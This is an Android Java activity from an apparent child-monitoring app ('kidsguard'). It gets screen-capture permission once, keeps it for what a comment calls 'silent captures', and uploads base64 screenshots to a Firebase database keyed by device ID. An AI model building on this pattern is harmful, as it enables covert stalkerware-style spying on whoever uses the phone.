package com.kidsguard.child;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Handler;
import android.util.Base64;
import android.util.DisplayMetrics;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class ScreenActivity extends Activity {

    private MediaProjectionManager mpm;
    private MediaProjection mp;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;
    private int resultCode;
    private Intent resultData;
    private boolean forStream = false;

    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        forStream = getIntent().getBooleanExtra("for_stream", false);
        mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

        // Agar pehle se permission hai to direct capture
        if (ScreenCaptureHolder.mp != null) {
            if (forStream) {
                startService(new Intent(this, StreamService.class));
            } else {
                ScreenCaptureHolder.captureOnce(this);
            }
            finish();
            return;
        }

        startActivityForResult(mpm.createScreenCaptureIntent(), 100);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 100 && resultCode == RESULT_OK) {
            this.resultCode = resultCode;
            this.resultData = data;

            // Persist MediaProjection for future silent captures
            mp = mpm.getMediaProjection(resultCode, data);
            ScreenCaptureHolder.setMediaProjection(mp);

            if (forStream) {
                Intent i = new Intent(this, StreamService.class);
                if (android.os.Build.VERSION.SDK_INT >= 26) {
                    startForegroundService(i);
                } else {
                    startService(i);
                }
                finish();
            } else {
                captureScreen();
            }
        } else {
            finish();
        }
    }

    private void captureScreen() {
        DisplayMetrics metrics = new DisplayMetrics();
        getWindowManager().getDefaultDisplay().getMetrics(metrics);
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);

        virtualDisplay = mp.createVirtualDisplay(
                "ScreenCapture", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null);

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    Image image = imageReader.acquireLatestImage();
                    if (image != null) {
                        Bitmap bitmap = imageToBitmap(image);
                        image.close();

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                        byte[] compressed = baos.toByteArray();
                        String b64 = Base64.encodeToString(compressed, Base64.NO_WRAP);

                        String devId = LocationService.getSafeDeviceId(ScreenActivity.this);
                        String timeStr = new SimpleDateFormat("HH:mm dd/MM", Locale.getDefault())
                                .format(new Date());
                        String json = "{\"image\":\"" + b64 + "\",\"time\":\"" + timeStr + "\"}";
                        FirebaseHelper.put("devices/" + devId + "/screenshots/"
                                + System.currentTimeMillis() + ".json", json);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    cleanup();
                    finish();
                }
            }
        }, 500);
    }

    private Bitmap imageToBitmap(Image image) {
        int width = image.getWidth();
        int height = image.getHeight();
        Image.Plane plane = image.getPlanes()[0];
        ByteBuffer buffer = plane.getBuffer();
        int pixelStride = plane.getPixelStride();
        int rowStride = plane.getRowStride();
        int rowPadding = rowStride - pixelStride * width;

        Bitmap bitmap = Bitmap.createBitmap(
                width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
        bitmap.copyPixelsFromBuffer(buffer);
        return Bitmap.createBitmap(bitmap, 0, 0, width, height);
    }

    private void cleanup() {
        if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }
        if (imageReader != null) { imageReader.close(); imageReader = null; }
        // NOTE: mp ko release NAHI karte — ScreenCaptureHolder me persist karta hai
    }
}
